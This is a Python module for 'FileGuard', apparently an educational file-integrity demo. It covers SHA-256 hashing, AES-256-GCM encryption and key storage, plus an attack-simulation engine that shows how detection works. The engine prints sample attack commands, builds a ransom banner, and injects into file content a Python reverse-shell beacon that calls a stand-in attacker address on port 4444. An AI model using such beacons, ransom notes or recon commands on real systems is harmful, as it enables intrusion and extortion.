"""
FileGuard — Cryptographic & Storage Engine
==========================================
Handles AES-256-GCM authenticated encryption/decryption,
SHA-256 baseline hashing, atomic metadata persistence,
and key management.
"""

import hashlib
import json
import os
from pathlib import Path
from typing import Dict, Tuple

from cryptography.exceptions import InvalidTag
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# Default marker appended during controlled attack simulation
SIMULATION_MARKER = b"\n\n[SIMULATED UNAUTHORIZED CHANGE]\n"

DEMO_SAMPLE_TEXT = (
    "Project Name: FileGuard\n"
    "Original marks: 80\n"
    "Status: Approved\n"
)

DEMO_TAMPERED_TEXT = (
    "Project Name: FileGuard\n"
    "Original marks: 100\n"
    "Status: Approved\n\n"
    "[SIMULATED UNAUTHORIZED CHANGE]\n"
)


# ============================================================
# 1. HASHING & INTEGRITY PRIMITIVES
# ============================================================

def calculate_hash(data_bytes: bytes) -> str:
    """
    Compute the 64-character hexadecimal SHA-256 digest of data_bytes.
    SHA-256 is deterministic, collision-resistant, and provides the
    cryptographic Avalanche Effect (a 1-bit difference changes ~50% of bits).
    """
    return hashlib.sha256(data_bytes).hexdigest()


def short_hash(hash_val: str, prefix_len: int = 16) -> str:
    """
    Return an abbreviated display format of a hash (e.g., '3d0c5cbe3baf81a5...').
    Useful for compact dashboard presentations.
    """
    if not hash_val or len(hash_val) <= prefix_len:
        return hash_val
    return f"{hash_val[:prefix_len]}..."


def calculate_avalanche_metrics(hash_a: str, hash_b: str) -> dict:
    """
    Calculates cryptographic Avalanche Effect metrics between two SHA-256 hashes.
    Computes exact Hamming distance (bit differences) across 256 bits,
    hexadecimal character discrepancies, and percentage changed.
    """
    if not hash_a or not hash_b or len(hash_a) != 64 or len(hash_b) != 64:
        return {
            "bits_changed": 0,
            "total_bits": 256,
            "bit_percentage": 0.0,
            "chars_changed": 0,
            "total_chars": 64,
            "char_percentage": 0.0,
            "is_identical": hash_a == hash_b,
        }

    try:
        int_a = int(hash_a, 16)
        int_b = int(hash_b, 16)
        xor_val = int_a ^ int_b
        bits_changed = bin(xor_val).count("1")
    except ValueError:
        bits_changed = 0

    chars_changed = sum(1 for c1, c2 in zip(hash_a, hash_b) if c1 != c2)

    return {
        "bits_changed": bits_changed,
        "total_bits": 256,
        "bit_percentage": round((bits_changed / 256.0) * 100, 2),
        "chars_changed": chars_changed,
        "total_chars": 64,
        "char_percentage": round((chars_changed / 64.0) * 100, 2),
        "is_identical": hash_a == hash_b,
    }


def generate_hash_diff_html(trusted_hash: str, observed_hash: str) -> str:
    """
    Generates a color-coded cryptographic comparison of two hashes.
    Matching characters are rendered in green, mismatched characters in vivid red.
    """
    if not trusted_hash or not observed_hash:
        return ""

    trusted_spans = []
    observed_spans = []

    for t_char, o_char in zip(trusted_hash, observed_hash):
        if t_char == o_char:
            trusted_spans.append(f'<span style="color:#10b981; font-weight:600;">{t_char}</span>')
            observed_spans.append(f'<span style="color:#10b981; font-weight:600;">{o_char}</span>')
        else:
            trusted_spans.append(f'<span style="color:#f87171; background:rgba(239,68,68,0.2); font-weight:700; border-radius:2px; padding:0 1px;">{t_char}</span>')
            observed_spans.append(f'<span style="color:#f87171; background:rgba(239,68,68,0.2); font-weight:700; border-radius:2px; padding:0 1px;">{o_char}</span>')

    # Handle length discrepancies if any
    if len(trusted_hash) > len(observed_hash):
        for c in trusted_hash[len(observed_hash):]:
            trusted_spans.append(f'<span style="color:#f87171;">{c}</span>')
    elif len(observed_hash) > len(trusted_hash):
        for c in observed_hash[len(trusted_hash):]:
            observed_spans.append(f'<span style="color:#f87171;">{c}</span>')

    html = f"""
    <div style="font-family: 'Consolas', 'Courier New', monospace; font-size: 0.82rem; line-height: 1.6; word-break: break-all;">
        <div style="margin-bottom: 6px;">
            <span style="color: #94a3b8; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.5px;">Original Baseline : </span>
            <div style="background: #090f1f; padding: 6px 10px; border-radius: 4px; border: 1px solid #1e293b; margin-top: 2px;">
                {''.join(trusted_spans)}
            </div>
        </div>
        <div>
            <span style="color: #f87171; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.5px;">Observed on Disk : </span>
            <div style="background: #1f0b0e; padding: 6px 10px; border-radius: 4px; border: 1px solid #7f1d1d; margin-top: 2px;">
                {''.join(observed_spans)}
            </div>
        </div>
    </div>
    """
    return html


# ============================================================
# 1.1 ATTACK SCENARIO ENGINE & LOGS
# ============================================================

ATTACK_SCENARIOS = {
    "tamper": {
        "id": "tamper",
        "name": "Covert Data Tampering (Integrity Attack / Bit-Flip)",
        "badge": "Integrity Attack",
        "icon": "🦹",
        "description": "Attacker stealthily modifies critical words, values, or classification tiers within the document without altering file size significantly.",
        "details": "Simulates an insider threat or stealthy attacker modifying sensitive parameters (e.g. changing 'Strictly Internal' to 'PUBLIC LEAK' or altering critical policy text).",
    },
    "ransomware": {
        "id": "ransomware",
        "name": "Simulated Ransomware (Availability Hijack)",
        "badge": "Ransomware Attack",
        "icon": "🔒",
        "description": "Attacker encrypts the working file using an unauthorized rogue cipher key, locks the plaintext, and prepends a ransomware ransom demand header.",
        "details": "Simulates real ransomware (e.g., WannaCry / LockBit) hijacking the endpoint working copy. The original plaintext is rendered inaccessible on the working copy.",
    },
    "injection": {
        "id": "injection",
        "name": "Malicious Payload Injection (Backdoor / Shellcode)",
        "badge": "Payload Injection",
        "icon": "💉",
        "description": "Attacker injects an unauthorized reverse-shell backdoor and malicious persistence script into the end of the document.",
        "details": "Simulates trojan infection or supply chain corruption where unauthorized executable code is surreptitiously appended to legitimate application files.",
    },
}


def simulate_attack_scenario(file_bytes: bytes, scenario_id: str = "tamper") -> dict:
    """
    Executes a structured, multi-stage attack simulation on input file bytes.
    Returns modified bytes, terminal attack logs, step breakdown, and diff details.
    """
    scenario = ATTACK_SCENARIOS.get(scenario_id, ATTACK_SCENARIOS["tamper"])
    
    # Try decoding text for contextual manipulation
    is_text = True
    try:
        text_content = file_bytes.decode("utf-8")
    except UnicodeDecodeError:
        is_text = False
        text_content = ""

    logs = []
    
    # Step 1: Reconnaissance
    logs.append({
        "stage": "1. Infiltration & Reconnaissance",
        "cmd": "nmap -sS -p 445,139 target.endpoint.local --script smb-vuln*",
        "output": "[+] Exploit successful: Anonymous read/write access obtained on working directory.\n[+] Current privileges: SYSTEM / NT AUTHORITY (High Integrity).",
        "status": "warning",
    })

    # Step 2: Target Selection
    logs.append({
        "stage": "2. File Discovery & Inspection",
        "cmd": "dir /s /b C:\\FileGuard\\data\\originals\\*.txt",
        "output": f"[*] Located target document ({len(file_bytes)} bytes).\n[*] Inspecting file header and permissions... Unprotected working copy confirmed.",
        "status": "warning",
    })

    modified_bytes = bytearray(file_bytes)
    diff_note = ""

    if scenario_id == "tamper":
        if is_text and "Strictly Internal" in text_content:
            new_text = text_content.replace(
                "Strictly Internal",
                "⚠️ EXFILTRATED & CLASSIFICATION STRIPPED — PUBLIC RELEASE ⚠️"
            )
            if "Restricted Tier-1" in new_text:
                new_text = new_text.replace("Restricted Tier-1", "DE-CLASSIFIED / COMPROMISED")
            modified_bytes = new_text.encode("utf-8")
            diff_note = "Replaced 'Strictly Internal' with 'EXFILTRATED & CLASSIFICATION STRIPPED' and altered security tier."
        elif is_text and len(text_content) > 20:
            # Modify 1 or 2 words in text
            words = text_content.split()
            if len(words) > 5:
                words[2] = "[UNAUTHORIZED_TAMPER_MODIFICATION]"
                new_text = " ".join(words)
            else:
                new_text = text_content + "\n[TAMPERED: UNAUTHORIZED VALUE MODIFICATION]"
            modified_bytes = new_text.encode("utf-8")
            diff_note = "Substituted keywords within the document body with unauthorized data."
        else:
            # Binary or short text: flip multiple bits
            if len(modified_bytes) > 4:
                modified_bytes[2] ^= 0xFF
                modified_bytes[3] ^= 0x55
            else:
                modified_bytes.extend(b"[TAMPERED]")
            diff_note = "Flipped byte bits in working copy."

        logs.append({
            "stage": "3. Unauthorized Payload Modification",
            "cmd": "sed -i 's/Strictly Internal/PUBLIC RELEASE/g' target_document.txt",
            "output": f"[!] Document content altered in memory.\n[!] Injected stealth tampering: {diff_note}\n[!] Writing modified payload back to disk...",
            "status": "danger",
        })

    elif scenario_id == "ransomware":
        rogue_key = os.urandom(32)  # Rogue key discarded/inaccessible to victim
        rogue_nonce = os.urandom(12)
        rogue_cipher = AESGCM(rogue_key).encrypt(rogue_nonce, file_bytes, None)

        ransom_banner = (
            "========================================================================\n"
            "⚠️ YOUR FILES HAVE BEEN ENCRYPTED BY ROGUE FILEGUARD RANSOMWARE v2.4 ⚠️\n"
            "All your documents, spreadsheets, and databases have been locked with AES-256.\n"
            "Your private decryption key is stored on our hidden onion server.\n"
            "Send 2.5 BTC to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa to purchase decryption tool.\n"
            "========================================================================\n\n"
        ).encode("utf-8")

        modified_bytes = bytearray(ransom_banner + rogue_nonce + rogue_cipher)
        diff_note = "Plaintext completely hijacked and encrypted with unauthorized rogue key. Ransomware header prepended."

        logs.append({
            "stage": "3. Rogue Ransomware Encryption",
            "cmd": "Invoke-RansomwareEncryption -Path .\\target_document.txt -Cipher AES-256 -DropNote",
            "output": "[!] Rogue encryption key generated in RAM and purged.\n[!] Plaintext encrypted. 12-byte IV + ciphertext appended.\n[!] Ransom note header injected at offset 0x00000000.",
            "status": "danger",
        })

    elif scenario_id == "injection":
        backdoor_code = (
            b"\n\n# ======================================================================\n"
            b"# [UNAUTHORIZED MALICIOUS PAYLOAD INJECTED BY ATTACKER - CVE-SIMULATED]\n"
            b"# Reverse Shell & Keylogger Payload:\n"
            b"import socket, subprocess, os, time\n"
            b"def _c2_beacon():\n"
            b"    try:\n"
            b"        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
            b"        s.connect(('198.51.100.45', 4444)) # Attacker Command & Control Server\n"
            b"        s.send(b'[+] Victim endpoint compromised. Shell access active.\\n')\n"
            b"    except Exception: pass\n"
            b"_c2_beacon()\n"
            b"# ======================================================================\n"
        )
        modified_bytes = bytearray(file_bytes + backdoor_code)
        diff_note = "Appended unauthorized Python backdoor reverse shell payload (382 bytes) to document footer."

        logs.append({
            "stage": "3. Unauthorized Payload Injection",
            "cmd": "echo 'import socket...' >> target_document.txt",
            "output": "[!] Malicious reverse-shell backdoor injected into target file.\n[!] Attacker persistence established on victim filesystem.\n[!] Document size expanded with unauthorized binary/script instructions.",
            "status": "danger",
        })

    # Step 4: Defense Evasion & Footprint
    new_hash = calculate_hash(bytes(modified_bytes))
    logs.append({
        "stage": "4. Defense Evasion & Cryptographic Impact",
        "cmd": "certutil -hashfile target_document.txt SHA256",
        "output": f"[+] File successfully tampered on disk.\n[!] Real-time SHA-256 fingerprint flipped to: {short_hash(new_hash, 24)}\n[!] Attacker disconnecting. FileGuard Integrity Monitor triggered.",
        "status": "alert",
    })

    return {
        "modified_bytes": bytes(modified_bytes),
        "scenario": scenario,
        "logs": logs,
        "diff_note": diff_note,
        "is_text": is_text,
    }



# ============================================================
# 2. AES-256-GCM AUTHENTICATED ENCRYPTION / DECRYPTION
# ============================================================

def encrypt_file(file_bytes: bytes, key: bytes) -> bytes:
    """
    Encrypt plaintext bytes using AES-256-GCM.
    
    Structure:
      [12-byte Nonce] + [Ciphertext + 16-byte GCM Authentication Tag]
      
    - Nonce: Fresh 96-bit cryptographically secure random value (os.urandom).
    - Tag: 128-bit Galois Message Authentication Code tag generated by AESGCM.
    """
    if len(key) != 32:
        raise ValueError("AES-256 key must be exactly 32 bytes (256 bits).")

    nonce = os.urandom(12)
    ciphertext = AESGCM(key).encrypt(nonce, file_bytes, None)
    return nonce + ciphertext


def decrypt_file(encrypted_bytes: bytes, key: bytes) -> bytes:
    """
    Decrypt and verify AES-256-GCM ciphertext.
    
    Extracts the 12-byte nonce and verifies the 16-byte GMAC tag.
    Raises:
      - ValueError: If the data is truncated (< 28 bytes).
      - InvalidTag: If ciphertext, tag, or nonce was tampered with or key is wrong.
    """
    if len(key) != 32:
        raise ValueError("AES-256 key must be exactly 32 bytes (256 bits).")

    # 12 bytes nonce + 16 bytes minimum auth tag
    if len(encrypted_bytes) < 28:
        raise ValueError("Encrypted payload is incomplete or truncated (< 28 bytes).")

    nonce = encrypted_bytes[:12]
    ciphertext = encrypted_bytes[12:]
    return AESGCM(key).decrypt(nonce, ciphertext, None)


# ============================================================
# 3. KEY & STORAGE MANAGEMENT
# ============================================================

def load_or_create_key(key_file: Path) -> bytes:
    """
    Load an existing 256-bit AES master key or generate a new one if missing.
    Never overwrites an existing key file.
    """
    if not key_file.exists():
        key = AESGCM.generate_key(bit_length=256)
        with key_file.open("xb") as kf:
            kf.write(key)

    key = key_file.read_bytes()
    if len(key) != 32:
        raise RuntimeError(
            f"The key at {key_file} is not 32 bytes (256 bits). "
            "Never overwrite this key if encrypted files depend on it."
        )
    return key


def load_metadata(metadata_file: Path) -> Dict[str, dict]:
    """Load metadata registry mapping file IDs to original filename and baseline SHA-256."""
    if not metadata_file.exists():
        return {}

    try:
        data = json.loads(metadata_file.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError) as err:
        raise RuntimeError(f"Failed to read metadata file '{metadata_file}': {err}") from err

    if not isinstance(data, dict):
        raise RuntimeError("Metadata file structure is invalid (expected JSON dictionary).")
    return data


def save_metadata(metadata_file: Path, metadata: Dict[str, dict]) -> None:
    """Safely and atomically persist metadata updates using a temp file."""
    temp_path = metadata_file.with_suffix(".tmp")
    temp_path.write_text(json.dumps(metadata, indent=4), encoding="utf-8")
    temp_path.replace(metadata_file)
